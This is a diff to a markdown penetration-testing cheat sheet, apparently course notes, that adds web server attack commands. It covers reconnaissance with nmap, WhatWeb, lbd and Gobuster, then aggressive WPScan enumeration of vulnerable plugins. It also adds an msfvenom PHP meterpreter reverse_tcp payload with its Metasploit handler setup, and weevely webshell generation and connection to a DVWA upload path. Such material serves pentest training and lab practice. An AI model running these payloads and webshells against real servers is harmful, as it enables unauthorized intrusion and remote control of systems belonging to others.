@@ -32,8 +32,80 @@ Obtains information about emails, source code disclosures, and external hosts.
 uniscan -u [HOST] -d
 ```
 
-#### Enamerate server using nmap
-[nmap-cheat-sheet.md](nmap-cheat-sheet.md)
+#### Perform a port and service discovery scan using nmap
+
+```sh
+nmap -T4 -A -v [HOST]
+```
+
+#### Perform web application reconnaissance using WhatWeb
+WhatWeb recognizes web technologies, such as blogging platforms, email addresses, content management systems (CMS), account IDs, statistics and analytics packages, JavaScript libraries, and embedded devices. It also identifies version numbers, web servers, web framework modules, etc.
+
+```sh
+whatweb [HOST]
+```
+
+```sh
+whatweb -v [HOST]
+```
+
+#### Detect Load Balancers
+
+```sh
+dig [HOST]
+```
+```sh
+lbd [HOST]
+```
+
+#### Enumerate server using nmap (applications, directories, and files)
+
+```sh
+nmap -sV --script http-enum [HOST]
+```
+
+#### Fast-paced enumeration of the hidden files and directories of the target web application using Gobuster
+
+```sh
+gobuster dir -u [HOST] -w [DICTIONARY]
+```
+
+### Attack website
+
+```sh
+wpscan --api-token [API Token] --url [HOST] --plugins-detection aggressive --enumerate vp
+```
+
+--enumerate vp: Specifies the enumeration of vulnerable plugins.
+
+### Create meterpreter php payload and encode using msfvenom
+
+```sh
+msfvenom -p php/meterpreter/reverse_tcp LHOST=[IP Address of Host Machine] LPORT=4444 -f raw
+```
+
+Upload and open the file in the web server...
+
+```sh
+use exploit/multi/handler
+set payload php/meterpreter/reverse_tcp
+set LHOST [IP Address of Host Machine]
+set LPORT 4444
+run
+```
+
+### Webshell using weevely
+
+```sh
+weevely generate [PASSWORD] [FILE PATH]
+```
+
+Upload the shell to the web server...
+
+```sh
+weevely http://10.10.10.16:8080/dvwa/hackable/uploads/shell.php [PASSWORD]
+```
+
 
 [<- Back to index](README.md)
 
